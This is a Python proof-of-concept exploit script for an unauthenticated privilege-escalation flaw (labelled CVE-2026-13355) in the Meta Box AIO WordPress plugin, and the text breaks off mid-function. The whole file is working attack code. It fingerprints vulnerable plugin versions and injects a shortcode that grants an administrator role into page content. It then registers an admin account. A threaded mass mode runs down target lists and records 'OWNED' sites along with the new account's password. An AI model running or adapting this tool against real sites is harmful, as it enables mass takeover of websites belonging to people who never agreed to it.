#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Archived for authorized security research only.
# Source: https://github.com/murrez/CVE-2026-13355 (see README for attribution/license)
"""
CVE-2026-13355 - Meta Box AIO <= 3.11.0 (MB Frontend Submission <= 4.5.6)
Unauthenticated privilege escalation to administrator via chained frontend form abuse
and [mb_user_profile_register role="administrator" auto_login="true"] injection.
"""

from __future__ import annotations

import argparse
import json
import random
import re
import string
import sys
import threading
import time
from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait
from html import unescape
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass

import requests
from requests.adapters import HTTPAdapter

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)

PLUGIN_SLUG = "meta-box-aio"
MAX_AIO_VERSION = (3, 11, 0)
MAX_MBFS_VERSION = (4, 5, 6)
MAX_MBUP_VERSION = (3, 11, 0)

OBJECT_ID_QS = "rwmb_frontend_field_object_id"
INJECT_SHORTCODE = '[mb_user_profile_register role="administrator" auto_login="true"]'

DEFAULT_PATHS = (
    "/",
    "/contact/",
    "/register/",
    "/registration/",
    "/signup/",
    "/sign-up/",
    "/submit/",
    "/submission/",
    "/add-post/",
    "/dashboard/",
    "/profile/",
    "/login/",
    "/membership/",
    "/blog/",
)

FRONTEND_MARKERS = (
    "mb_frontend_form",
    "mb-frontend-form",
    "rwmb-frontend",
    "mb-frontend-submission",
    "rwmb-form",
    "rwmb_frontend_field_object_id",
)

REGISTER_MARKERS = (
    "mb_user_profile_register",
    "mb-user-profile-register",
    "rwmb-profile-register",
    "nonce_rwmb-user-register",
    'id="register-form"',
)

print_lock = threading.Lock()


def log(msg):
    with print_lock:
        print(msg, flush=True)


def mk_session(timeout, proxy=None):
    s = requests.Session()
    s.headers.update({"User-Agent": UA})
    adapter = HTTPAdapter(max_retries=0, pool_connections=30, pool_maxsize=30)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    if proxy:
        s.proxies.update({"http": proxy, "https": proxy})
    s.verify = False
    s.request_timeout = timeout
    return s


def get(s, url, **kw):
    kw.setdefault("timeout", s.request_timeout)
    kw.setdefault("verify", False)
    kw.setdefault("allow_redirects", True)
    return s.get(url, **kw)


def post(s, url, **kw):
    kw.setdefault("timeout", s.request_timeout)
    kw.setdefault("verify", False)
    kw.setdefault("allow_redirects", True)
    return s.post(url, **kw)


def normalize_base(raw):
    raw = (raw or "").strip()
    if not raw or raw.startswith("#"):
        return None
    if "://" not in raw:
        raw = "https://" + raw
    p = urlparse(raw)
    if not p.netloc:
        return None
    scheme = p.scheme if p.scheme in ("http", "https") else "https"
    return "%s://%s" % (scheme, p.netloc)


def resolve_page_url(base, raw):
    if not raw:
        return None
    raw = raw.strip()
    if raw.startswith(("http://", "https://")):
        return raw
    if not raw.startswith("/"):
        raw = "/" + raw
    return base.rstrip("/") + raw


def parse_version_tuple(text):
    if not text:
        return None
    patterns = [
        r"Stable tag:\s*([0-9]+(?:\.[0-9]+)*)",
        r"Version:\s*([0-9]+(?:\.[0-9]+)*)",
    ]
    for pat in patterns:
        m = re.search(pat, text, re.I)
        if m:
            parts = []
            for x in m.group(1).split("."):
                try:
                    parts.append(int(x))
                except ValueError:
                    break
            if parts:
                return tuple(parts)
    return None


def version_le(a, b):
    if not a:
        return False
    n = max(len(a), len(b))
    av = a + (0,) * (n - len(a))
    bv = b + (0,) * (n - len(b))
    return av <= bv


def plugin_probe_urls(base):
    root = base.rstrip("/") + "/wp-content/plugins"
    return [
        ("meta-box-aio", root + "/meta-box-aio/meta-box-aio.php"),
        ("meta-box-aio", root + "/meta-box-aio/readme.txt"),
        ("mb-frontend-submission", root + "/mb-frontend-submission/mb-frontend-submission.php"),
        ("mb-user-profile", root + "/mb-user-profile/mb-user-profile.php"),
    ]


def detect_plugin(s, base, timeout):
    out = {
        "plugin": False,
        "version": None,
        "vulnerable": False,
        "patched": False,
        "components": [],
    }
    versions = {}
    for slug, url in plugin_probe_urls(base):
        try:
            r = get(s, url, timeout=timeout)
        except requests.RequestException:
            continue
        if r.status_code != 200:
            continue
        body = r.text or ""
        if slug not in body.lower() and "meta box" not in body and "Plugin Name" not in body:
            if not url.endswith(".php"):
                continue
        ver = parse_version_tuple(body)
        if ver:
            versions[slug] = ver
            out["components"].append({"slug": slug, "version": ".".join(str(x) for x in ver)})

    aio = versions.get("meta-box-aio")
    mbfs = versions.get("mb-frontend-submission")
    mbup = versions.get("mb-user-profile")

    if aio:
        out["plugin"] = True
        out["version"] = ".".join(str(x) for x in aio)
        if version_le(aio, MAX_AIO_VERSION):
            out["vulnerable"] = True
        else:
            out["patched"] = True
        return out

    if mbfs or mbup:
        out["plugin"] = True
        vuln = False
        if mbfs and version_le(mbfs, MAX_MBFS_VERSION):
            vuln = True
            out["version"] = ".".join(str(x) for x in mbfs)
        if mbup and version_le(mbup, MAX_MBUP_VERSION):
            vuln = True
            if not out["version"]:
                out["version"] = ".".join(str(x) for x in mbup)
        out["vulnerable"] = vuln
        if not vuln:
            out["patched"] = True
        return out

    # Fingerprint assets without readable version
    asset_urls = [
        base.rstrip("/") + "/wp-content/plugins/meta-box-aio/assets/",
        base.rstrip("/") + "/wp-content/plugins/mb-frontend-submission/assets/",
    ]
    for url in asset_urls:
        try:
            r = get(s, url, timeout=timeout)
        except requests.RequestException:
            continue
        if r.status_code in (200, 403):
            out["plugin"] = True
            out["vulnerable"] = True
            break

    return out


def has_frontend_markers(html):
    if not html:
        return False
    low = html.lower()
    return any(m in low for m in FRONTEND_MARKERS)


def has_register_markers(html):
    if not html:
        return False
    low = html.lower()
    return any(m in low for m in REGISTER_MARKERS)


def extract_wp_object_id(html):
    if not html:
        return None
    patterns = [
        r'\bpage-id-(\d+)\b',
        r'\bpostid-(\d+)\b',
    ]
    for pat in patterns:
        m = re.search(pat, html, re.I)
        if m:
            pid = int(m.group(1))
            if pid > 0:
                return pid
    return None


def classify_form(form):
    names = set(form.get("field_names") or [])
    html = (form.get("html") or "").lower()
    if "mbfs_key" in names or "mbfs-form" in html:
        return "mbfs"
    if "mbup_key" in names or "mbup-form" in html:
        return "mbup"
    return "other"


def select_mbfs_form(forms):
    """CVE chain needs MB Frontend Submission (mbfs), not login-only mbup."""
    mbfs = [f for f in forms if classify_form(f.get("form") or {}) == "mbfs"]
    if not mbfs:
        return None
    mbfs.sort(
        key=lambda f: (
            0 if f["form"].get("has_post_content") else 1,
            f.get("page_url") or "",
        )
    )
    return mbfs[0]


def with_object_id(url, object_id):
    p = urlparse(url)
    q = parse_qs(p.query, keep_blank_values=True)
    q[OBJECT_ID_QS] = [str(object_id)]
    return urlunparse(p._replace(query=urlencode(q, doseq=True)))


def content_view_urls(base, object_id):
    b = base.rstrip("/")
    return [
        b + "/?p=%d" % object_id,
        b + "/?page_id=%d" % object_id,
    ]


def extract_rwmb_forms(html):
    if not html:
        return []
    forms = []
    for m in re.finditer(r"<form\b[^>]*>.*?</form>", html, re.I | re.S):
        chunk = m.group(0)
        low = chunk.lower()
        if not any(x in low for x in ("rwmb", "frontend", "mb-frontend", "meta-box")):
            continue
        action_m = re.search(r'action=["\']([^"\']*)["\']', chunk, re.I)
        method_m = re.search(r'method=["\']([^"\']*)["\']', chunk, re.I)
        action = unescape(action_m.group(1)) if action_m else ""
        method = (method_m.group(1) if method_m else "post").lower()
        fields = {}
        names = []
        for inp in re.finditer(
            r'<(?:input|textarea|select)\b[^>]*\bname=["\']([^"\']+)["\'][^>]*>',
            chunk,
            re.I,
        ):
            name = inp.group(1)
            if name.endswith("[]"):
                continue
            names.append(name)
            tag = inp.group(0)
            type_m = re.search(r'type=["\']([^"\']+)["\']', tag, re.I)
            typ = (type_m.group(1).lower() if type_m else "text").lower()
            val_m = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
            if typ in ("hidden", "submit", "button"):
                fields[name] = unescape(val_m.group(1)) if val_m else ""
            elif typ == "checkbox":
                fields[name] = "1"
        has_content = "post_content" in names or any("content" in n.lower() for n in names)
        item = {
            "action": action,
            "method": method,
            "fields": fields,
            "field_names": names,
            "has_post_content": has_content,
            "html": chunk[:4000],
        }
        item["kind"] = classify_form(item)
        forms.append(item)
    return forms


def extract_mbfs_form_html(html):
    if not html:
        return None
    for m in re.finditer(r"<form\b[^>]*>.*?</form>", html, re.I | re.S):
        chunk = m.group(0)
        if "mbfs-form" in chunk.lower() or "mbfs_key" in chunk.lower():
            return chunk
    return None


def extract_submit_fields(form_html):
    out = {}
    if not form_html:
        return out
    for tag in re.findall(r"<(?:input|button)\b[^>]+>", form_html, re.I):
        if not re.search(r'type=["\']submit["\']', tag, re.I):
            continue
        n = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
        v = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
        if n:
            out[n.group(1)] = v.group(1) if v else "Submit"
    return out


def poison_applied(html, shortcode):
    if not html:
        return False
    if shortcode in html:
        return True
    low = html.lower()
    if "mb_user_profile_register" in low and 'role="administrator"' in html:
        return True
    if "nonce_rwmb-user-register" in low and "mbup-form" in low:
        return True
    return False


def find_register_page(s, base, form_page, object_id, shortcode, timeout):
    candidates = []
    seen = set()
    for cand in [form_page] + content_view_urls(base, object_id):
        if cand and cand not in seen:
            seen.add(cand)
            candidates.append(cand)
    for cand in candidates:
        try:
            r = get(s, cand, timeout=timeout)
        except requests.RequestException:
            continue
        if r.status_code == 200 and (
            has_register_markers(r.text) or poison_applied(r.text, shortcode)
        ):
            return r.url, r.text
    return form_page, ""


def discover_frontend_forms(s, base, paths, timeout, max_pages=14):
    results = []
    seen_urls = set()
    for path in paths:
        if len(seen_urls) >= max_pages:
            break
        url = resolve_page_url(base, path)
        if not url or url in seen_urls:
            continue
        seen_urls.add(url)
        try:
            r = get(s, url, timeout=timeout)
        except requests.RequestException:
            continue
        if r.status_code != 200 or not has_frontend_markers(r.text):
            continue
        forms = extract_rwmb_forms(r.text)
        if not forms:
            forms = [{
                "action": "",
                "method": "post",
                "fields": {},
                "field_names": [],
                "has_post_content": "post_content" in (r.text or "").lower(),
                "html": "",
            }]
        page_id = extract_wp_object_id(r.text)
        for form in forms:
            results.append({
                "page_url": r.url,
                "page_id": page_id,
                "form": form,
            })
    return results


def resolve_form_action(base, page_url, action):
    if not action or action in ("#", ""):
        return page_url
    if action.startswith(("http://", "https://")):
        return action
    if action.startswith("/"):
        return base.rstrip("/") + action
    return page_url.rsplit("/", 1)[0] + "/" + action


def guess_register_fields(html):
    names = []
    for m in re.finditer(
        r'<(?:input|textarea|select)\b[^>]*\bname=["\']([^"\']+)["\']',
        html or "",
        re.I,
    ):
        names.append(m.group(1))
    login = email = password = confirm = None
    for name in names:
        low = name.lower()
        if not login and any(x in low for x in ("user_login", "username", "log")):
            login = name
        if not email and "email" in low:
            email = name
        if not password and any(x in low for x in ("user_pass", "password", "pwd")):
            if any(x in low for x in ("2", "confirm", "repeat", "again")):
                confirm = confirm or name
            elif not password:
                password = name
    if not login:
        for name in names:
            if "user" in name.lower() and "email" not in name.lower():
                login = name
                break
    return {
        "login": login,
        "email": email,
        "password": password,
        "confirm": confirm,
        "all_fields": names,
    }


def extract_hidden_fields(html):
    out = {}
    for m in re.finditer(
        r'<input\b[^>]*type=["\']hidden["\'][^>]*>',
        html or "",
        re.I,
    ):
        tag = m.group(0)
        n = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
        v = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
        if n:
            out[n.group(1)] = unescape(v.group(1)) if v else ""
    return out


def poison_post_content(s, base, form_info, object_id, shortcode, timeout):
    page_url = form_info["page_url"]
    form = form_info["form"]
    if classify_form(form) != "mbfs":
        return {"ok": False, "error": "not_mbfs_form"}

    get_url = with_object_id(page_url, object_id)
    try:
        r0 = get(s, get_url, timeout=timeout)
    except requests.RequestException as e:
        return {"ok": False, "error": "prefetch: %s" % e}
    if r0.status_code != 200:
        return {"ok": False, "error": "prefetch HTTP %s" % r0.status_code, "status_code": r0.status_code}

    mbfs_html = extract_mbfs_form_html(r0.text) or form.get("html") or ""
    merged_fields = dict(form.get("fields") or {})
    merged_fields.update(extract_hidden_fields(mbfs_html or r0.text))
    merged_fields.update(extract_submit_fields(mbfs_html))
    merged_fields["post_content"] = shortcode
    if "post_title" in (form.get("field_names") or []):
        merged_fields.setdefault("post_title", "Meta Box")
    if "mbfs_key" not in merged_fields and "mbfs_key" in (form.get("field_names") or []):
        merged_fields.setdefault("mbfs_key", "")
    if "action" not in merged_fields:
        merged_fields.setdefault("action", "save")

    action_url = resolve_form_action(base, get_url, form.get("action"))
    post_url = with_object_id(action_url, object_id)

    headers = {
        "Referer": get_url,
        "Origin": base.rstrip("/"),
    }
    try:
        r = post(s, post_url, data=merged_fields, headers=headers, timeout=timeout)
    except requests.RequestException as e:
        return {"ok": False, "error": "post: %s" % e}

    body = r.text or ""
    submitted = "rwmb-form-submitted" in (r.url or "")
    verify_url, verify_html = find_register_page(
        s, base, page_url, object_id, shortcode, timeout,
    )
    verified = poison_applied(verify_html, shortcode)
    ok = (
        r.status_code in (200, 302, 303)
        and r.status_code != 403
        and (verified or submitted)
    )
    return {
        "ok": ok,
        "verified_content": verified,
        "rwmb_form_submitted": submitted,
        "status_code": r.status_code,
        "post_url": post_url,
        "object_id": object_id,
        "final_url": r.url,
        "verify_url": verify_url,
    }


def register_admin(s, base, page_url, fields, username, email, password, timeout):
    try:
        r = get(s, page_url, timeout=timeout)
    except requests.RequestException as e:
        return {"ok": False, "error": "load register page: %s" % e}
    if r.status_code != 200:
        return {"ok": False, "error": "register page HTTP %s" % r.status_code}
    if not has_register_markers(r.text):
        return {"ok": False, "error": "register shortcode not rendered"}

    reg_fields = fields or guess_register_fields(r.text)
    hidden = extract_hidden_fields(r.text)
    data = dict(hidden)
    if reg_fields.get("login"):
        data[reg_fields["login"]] = username
    if reg_fields.get("email"):
        data[reg_fields["email"]] = email
    elif "user_email" in hidden or "user_email" in (reg_fields.get("all_fields") or []):
        data["user_email"] = email
    if reg_fields.get("password"):
        data[reg_fields["password"]] = password
    if reg_fields.get("confirm"):
        data[reg_fields["confirm"]] = password
    elif reg_fields.get("password") and reg_fields["password"] + "2" in (reg_fields.get("all_fields") or []):
        data[reg_fields["password"] + "2"] = password

    headers = {
        "Referer": page_url,
        "Origin": base.rstrip("/"),
    }
    try:
        r2 = post(s, page_url, data=data, headers=headers, timeout=timeout, allow_redirects=True)
    except requests.RequestException as e:
        return {"ok": False, "error": "register post: %s" % e}

    admin_ok = verify_admin_session(s, base, timeout)
    return {
        "ok": admin_ok or r2.status_code in (200, 302),
        "admin": admin_ok,
        "status_code": r2.status_code,
        "fields_used": reg_fields,
        "final_url": r2.url,
    }


def verify_admin_session(s, base, timeout):
    admin_url = base.rstrip("/") + "/wp-admin/"
    try:
        r = get(s, admin_url, timeout=timeout, allow_redirects=False)
    except requests.RequestException:
        return False
    if r.status_code in (301, 302):
        loc = (r.headers.get("Location") or "").lower()
        if "wp-admin" in loc and "wp-login" not in loc:
            return True
        return False
    if r.status_code == 200 and "wp-login" not in (r.url or "").lower():
        low = (r.text or "").lower()
        if "dashboard" in low or "wp-admin-bar" in low:
            return True
    cookies = "; ".join("%s=%s" % (c.name, c.value) for c in s.cookies)
    if "wordpress_logged_in" in cookies:
        try:
            r2 = get(s, admin_url, timeout=timeout)
            if r2.status_code == 200 and "wp-login" not in r2.url.lower():
                return True
        except requests.RequestException:
            pass
    return False


def verify_login(s, base, username, password, timeout):
    url = base.rstrip("/") + "/wp-login.php"
    try:
        r = get(s, url, timeout=timeout)
        data = {
            "log": username,
            "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": base.rstrip("/") + "/wp-admin/",
            "testcookie": "1",
        }
        r2 = post(
            s, url, data=data,
            headers={"Referer": url, "Cookie": "wordpress_test_cookie=WP%20Cookie%20check;"},
            timeout=timeout,
            allow_redirects=False,
        )
        loc = (r2.headers.get("Location") or "").lower()
        if r2.status_code in (301, 302) and "wp-admin" in loc:
            return True
        if any(c.name.startswith("wordpress_logged_in") for c in r2.cookies):
            return True
    except requests.RequestException:
        pass
    return False


def check_target(url, timeout, proxy, paths, form_url=None, object_id=None):
    base = normalize_base(url)
    row = {
        "target": base,
        "status": "unknown",
        "plugin": False,
        "version": None,
        "vulnerable": False,
        "forms": [],
        "exploitable_candidate": False,
    }
    if not base:
        row["status"] = "ERR invalid url"
        return row

    s = mk_session(timeout, proxy)
    plug = detect_plugin(s, base, timeout)
    row.update({k: plug.get(k) for k in ("plugin", "version", "vulnerable", "components")})
    if not plug.get("plugin"):
        row["status"] = "no_plugin"
        return row
    if plug.get("patched"):
        row["status"] = "patched"
        return row

    row["vulnerable"] = True
    forms = discover_frontend_forms(s, base, paths, timeout)
    if form_url:
        fu = resolve_page_url(base, form_url)
        try:
            r = get(s, fu, timeout=timeout)
            if r.status_code == 200:
                extracted = extract_rwmb_forms(r.text)
                if not extracted:
                    extracted = [{
                        "action": "",
                        "method": "post",
                        "fields": {},
                        "field_names": [],
                        "has_post_content": True,
                        "html": "",
                    }]
                for form in extracted:
                    forms.insert(0, {
                        "page_url": r.url,
                        "page_id": extract_wp_object_id(r.text),
                        "form": form,
                    })
        except requests.RequestException:
            pass

    row["forms"] = [{
        "page_url": f["page_url"],
        "page_id": f.get("page_id"),
        "form_kind": classify_form(f.get("form") or {}),
        "has_post_content_field": f["form"].get("has_post_content"),
        "field_names": f["form"].get("field_names"),
    } for f in forms]

    if not forms:
        row["status"] = "plugin_no_frontend_forms"
        return row

    mbfs = select_mbfs_form(forms)
    if not mbfs:
        row["status"] = "plugin_mbup_only"
        row["note"] = "Meta Box User Profile forms only; need mbfs (frontend submission) for CVE-2026-13355"
        return row

    best = mbfs
    oid = object_id or best.get("page_id")
    row["best_form"] = {
        "page_url": best["page_url"],
        "page_id": best.get("page_id"),
        "object_id_hint": oid,
        "form_kind": "mbfs",
        "has_post_content_field": best["form"].get("has_post_content"),
    }
    row["exploitable_candidate"] = True
    row["status"] = "candidate_mbfs"
    return row


def exploit_target(
    url, timeout, proxy, paths, form_url, object_id,
    username, email, password, verify, shortcode,
):
    base = normalize_base(url)
    row = {
        "target": base,
        "ok": False,
        "exploited": False,
        "username": username,
        "email": email,
        "password": password,
        "steps": {},
    }
    if not base:
        row["error"] = "invalid url"
        return row

    s = mk_session(timeout, proxy)
    plug = detect_plugin(s, base, timeout)
    row["plugin"] = plug.get("plugin")
    row["version"] = plug.get("version")
    if not plug.get("plugin"):
        row["error"] = "plugin not found"
        return row
    if plug.get("patched"):
        row["error"] = "patched version"
        return row

    forms = discover_frontend_forms(s, base, paths, timeout)
    if form_url:
        fu = resolve_page_url(base, form_url)
        try:
            r = get(s, fu, timeout=timeout)
            if r.status_code == 200:
                extracted = extract_rwmb_forms(r.text)
                if not extracted:
                    extracted = [{
                        "action": "",
                        "method": "post",
                        "fields": {},
                        "field_names": [],
                        "has_post_content": True,
                        "html": "",
                    }]
                for form in extracted:
                    forms.insert(0, {
                        "page_url": r.url,
                        "page_id": extract_wp_object_id(r.text),
                        "form": form,
                    })
        except requests.RequestException as e:
            row["error"] = "form page: %s" % e
            return row

    if not forms:
        row["error"] = "frontend form not found"
        return row

    form_info = select_mbfs_form(forms)
    if not form_info:
        row["error"] = "no_mbfs_form (only mbup login/register — cannot inject post_content)"
        row["status"] = "plugin_mbup_only"
        return row

    oid = int(object_id) if object_id else form_info.get("page_id")
    if not oid:
        row["error"] = "object_id unknown; pass --object-id or use a page with page-id-* body class"
        row["form_page"] = form_info.get("page_url")
        return row

    if not email:
        email = username + "@mailinator.com"
    row["email"] = email

    poison = poison_post_content(
        s, base, form_info, oid, shortcode or INJECT_SHORTCODE, timeout,
    )
    row["steps"]["poison"] = poison
    if not poison.get("ok"):
        if poison.get("status_code") == 403:
            row["error"] = "content injection blocked (HTTP 403)"
        elif poison.get("error"):
            row["error"] = poison.get("error")
        elif not poison.get("verified_content"):
            row["error"] = "content injection not verified (POST accepted but shortcode not on page)"
        else:
            row["error"] = "content injection failed"
        return row

    sc = shortcode or INJECT_SHORTCODE
    register_page, reg_html = find_register_page(
        s, base, poison.get("verify_url") or form_info["page_url"], oid, sc, timeout,
    )
    if not has_register_markers(reg_html) and not poison_applied(reg_html, sc):
        row["error"] = "poison verified weak but register UI missing"
        row["steps"]["register"] = {"ok": False, "error": "register shortcode not rendered"}
        return row

    reg = register_admin(s, base, register_page, None, username, email, password, timeout)
    row["steps"]["register"] = reg
    row["register_page"] = register_page
    row["object_id"] = oid
    row["form_page"] = form_info["page_url"]

    if reg.get("admin"):
        row["ok"] = True
        row["exploited"] = True
    elif verify and verify_login(s, base, username, password, timeout):
        row["ok"] = True
        row["exploited"] = True
        row["verified"] = "wp-login"
    elif reg.get("ok"):
        row["ok"] = True
        row["exploited"] = True
        row["verified"] = "register_only"

    return row


def load_targets(path):
    seen = set()
    items = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if line.lower().startswith(("host,", "url,")):
                continue
            raw = line
            if "," in line:
                parts = [p.strip() for p in line.split(",")]
                host = parts[0]
                domain = parts[-1] if len(parts) >= 3 else ""
                if host.startswith("http"):
                    raw = host
                elif domain and "." in domain and not domain.replace(".", "").isdigit():
                    raw = domain
                elif host and "." in host:
                    raw = host
            base = normalize_base(raw)
            if base and base not in seen:
                seen.add(base)
                items.append(base)
    return items


class Stats:
    __slots__ = ("total", "done", "hits", "exploited", "err", "start", "last_progress")

    def __init__(self, total):
        self.total = total
        self.done = 0
        self.hits = 0
        self.exploited = 0
        self.err = 0
        self.start = time.time()
        self.last_progress = 0.0

    def bump(self, key, n=1):
        setattr(self, key, getattr(self, key) + n)


def flow_check_line(row):
    target = row.get("target") or "?"
    status = row.get("status") or row.get("error") or "unknown"
    ver = row.get("version") or "-"
    forms = len(row.get("forms") or [])
    if row.get("exploitable_candidate"):
        best = row.get("best_form") or {}
        return "[+] HIT %s | %s | v=%s | mbfs @ %s | oid=%s" % (
            target,
            status,
            ver,
            best.get("page_url") or "-",
            best.get("object_id_hint") or "-",
        )
    if status == "plugin_mbup_only":
        return "[.] %s | mbup_only (not exploitable via 13355 chain) | v=%s" % (target, ver)
    return "[.] %s | %s | v=%s | forms=%d" % (target, status, ver, forms)


def flow_exploit_line(row):
    target = row.get("target") or "?"
    if row.get("exploited"):
        return "[+] OWNED %s | user=%s | pass=%s | oid=%s" % (
            target,
            row.get("username"),
            row.get("password"),
            row.get("object_id"),
        )
    err = row.get("error")
    if not err:
        reg = (row.get("steps") or {}).get("register") or {}
        err = reg.get("error") or "exploit failed"
    poison = (row.get("steps") or {}).get("poison") or {}
    if poison and not err:
        err = "poison status=%s verified=%s" % (
            poison.get("status_code"), poison.get("verified_content"),
        )
    return "[-] %s | %s" % (target, err)


def mass_show_flow(args):
    if args.quiet or args.no_flow:
        return False
    if args.flow or args.list:
        return True
    return False


def run_mass(args):
    if args.list.endswith(".jsonl"):
        targets = []
        with open(args.list, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    obj = json.loads(line)
                except json.JSONDecodeError:
                    continue
                t = normalize_base(obj.get("target") or obj.get("url"))
                if not t:
                    continue
                best = obj.get("best_form") or obj
                targets.append((
                    t,
                    best.get("page_url") or obj.get("form_url"),
                    best.get("object_id_hint") or obj.get("object_id"),
                ))
        work = targets
    else:
        work = [(t, None, None) for t in load_targets(args.list)]

    stats = Stats(len(work))
    stream = mass_show_flow(args)
    out_f = open(args.output, "w", encoding="utf-8")
    hit_f = open(args.vuln_list, "w", encoding="utf-8")
    cand_f = open(args.candidates_list, "w", encoding="utf-8") if args.mode == "check" else None
    rnd_base = "".join(random.choices(string.ascii_lowercase, k=4))

    if not args.quiet:
        log("[*] CVE-2026-13355 mass %s | targets=%d | threads=%d | flow=%s" % (
            args.mode, len(work), args.threads, "on" if stream else "off"))
        log("[*] writing %s | hits -> %s" % (args.output, args.vuln_list))

    def worker(item):
        target, form_url, object_id = item
        if args.mode == "check":
            return check_target(
                target, args.timeout, args.proxy, tuple(args.paths or DEFAULT_PATHS),
                form_url=form_url, object_id=object_id,
            )
        uname = args.username or ("mbadm" + rnd_base + str(random.randint(100, 999)))
        mail = args.email or (uname + "@mailinator.com")
        pwd = args.password or ("MbAio!" + rnd_base + str(random.randint(1000, 9999)))
        return exploit_target(
            target, args.timeout, args.proxy, tuple(args.paths or DEFAULT_PATHS),
            form_url, object_id, uname, mail, pwd, args.verify, args.shortcode,
        )

    def handle(row):
        stats.bump("done")
        out_f.write(json.dumps(row, ensure_ascii=True, default=str) + "\n")
        out_f.flush()

        if args.mode == "exploit":
            if row.get("exploited"):
                stats.bump("exploited")
                hit_f.write("%s|%s|%s|%s|oid=%s\n" % (
                    row.get("target"), row.get("username"), row.get("email"),
                    row.get("password"), row.get("object_id")))
                hit_f.flush()
            elif row.get("error"):
                stats.bump("err")
        else:
            if row.get("exploitable_candidate"):
                stats.bump("hits")
                hit_f.write(row.get("target", "") + "\n")
                hit_f.flush()
                best = row.get("best_form") or {}
                cand_f.write(json.dumps({
                    "target": row.get("target"),
                    "version": row.get("version"),
                    "form_url": best.get("page_url"),
                    "object_id": best.get("object_id_hint"),
                }, ensure_ascii=True) + "\n")
                cand_f.flush()
            elif str(row.get("status", "")).startswith("ERR") or row.get("error"):
                stats.bump("err")

        if stream:
            if args.mode == "check":
                log(flow_check_line(row))
            else:
                log(flow_exploit_line(row))
        elif not args.quiet and args.mode == "check" and row.get("exploitable_candidate"):
            best = row.get("best_form") or {}
            log("[+] %s v=%s form=%s oid=%s" % (
                row.get("target"), row.get("version"),
                best.get("page_url"), best.get("object_id_hint")))
        elif not args.quiet and args.mode == "exploit" and row.get("exploited"):
            log("[+] EXPLOITED %s user=%s pass=%s oid=%s" % (
                row.get("target"), row.get("username"), row.get("password"), row.get("object_id")))

        if not args.quiet:
            now = time.time()
            if now - stats.last_progress >= 2.0 or stats.done == stats.total:
                stats.last_progress = now
                elapsed = now - stats.start
                rate = stats.done / elapsed if elapsed else 0
                remain = (stats.total - stats.done) / rate if rate else 0
                if args.mode == "exploit":
                    log("  [%d/%d] exploited=%d err=%d | %.1f/s | ETA %.0fs" % (
                        stats.done, stats.total, stats.exploited, stats.err, rate, remain))
                else:
                    log("  [%d/%d] candidates=%d err=%d | %.1f/s | ETA %.0fs" % (
                        stats.done, stats.total, stats.hits, stats.err, rate, remain))

    window = max(4, args.threads * 2)
    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        futures = {}
        gen = iter(work)
        try:
            while True:
                while len(futures) < window:
                    try:
                        item = next(gen)
                    except StopIteration:
                        break
                    futures[ex.submit(worker, item)] = item
                if not futures:
                    break
                done, _ = wait(futures, return_when=FIRST_COMPLETED)
                for fut in done:
                    futures.pop(fut)
                    try:
                        handle(fut.result())
                    except Exception as e:
                        stats.bump("err")
                        if not args.quiet:
                            log("[ERR] %s" % e)
        except KeyboardInterrupt:
            log("[!] interrupted")

    out_f.close()
    hit_f.close()
    if cand_f:
        cand_f.close()
    elapsed = time.time() - stats.start
    if args.mode == "exploit":
        log("[*] done %.0fs | %d/%d | exploited=%d err=%d | %s" % (
            elapsed, stats.done, stats.total, stats.exploited, stats.err, args.vuln_list))
    else:
        log("[*] done %.0fs | %d/%d | candidates=%d err=%d | %s" % (
            elapsed, stats.done, stats.total, stats.hits, stats.err, args.vuln_list))


def main():
    p = argparse.ArgumentParser(
        description="CVE-2026-13355 Meta Box AIO <=3.11.0 unauth administrator privilege escalation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python poc.py -u https://target.example --mode check
  python poc.py --list list.txt --mode check --threads 20
  python poc.py --list hits.txt --mode exploit --threads 8 --verify
  python poc.py --list list.txt --mode check --threads 20 --quiet
  python poc.py -u https://target.example --mode exploit --form-url /submit/ --object-id 42 --verify
""",
    )
    p.add_argument("-u", "--url", help="single target base URL")
    p.add_argument("--list", help="targets file (domains, FOFA CSV, or candidates.jsonl)")
    p.add_argument("--mode", choices=["check", "exploit"], default="check")
    p.add_argument("--form-url", help="page that embeds [mb_frontend_form ...]")
    p.add_argument("--object-id", type=int, help="post/page ID to overwrite via rwmb_frontend_field_object_id")
    p.add_argument("--paths", nargs="*", help="extra paths to crawl for frontend forms")
    p.add_argument("--username", help="new admin username (random if omitted)")
    p.add_argument("--email", help="registration email (random if omitted)")
    p.add_argument("--password", help="registration password (random if omitted)")
    p.add_argument("--shortcode", default=INJECT_SHORTCODE, help="shortcode payload for post_content")
    p.add_argument("--verify", action="store_true", help="also verify via wp-login if auto_login fails")
    p.add_argument("--threads", "-j", type=int, default=15)
    p.add_argument("--timeout", type=int, default=25)
    p.add_argument("--proxy", default=None)
    p.add_argument("--output", default="cve_2026_13355_results.jsonl")
    p.add_argument("--vuln-list", default="hits.txt")
    p.add_argument("--candidates-list", default="candidates.jsonl")
    p.add_argument(
        "--flow",
        action="store_true",
        help="print one line per target (default when using --list without --quiet)",
    )
    p.add_argument("--no-flow", action="store_true", help="only periodic summary + hits")
    p.add_argument("--quiet", "-q", action="store_true", help="minimal output (no flow)")
    args = p.parse_args()

    if not args.url and not args.list:
        p.error("need -u URL or --list FILE")

    paths = tuple(args.paths) if args.paths else DEFAULT_PATHS

    if args.list:
        run_mass(args)
        return

    single_flow = not args.quiet and not args.no_flow

    if args.mode == "check":
        if single_flow:
            log("[*] checking %s ..." % normalize_base(args.url))
        row = check_target(
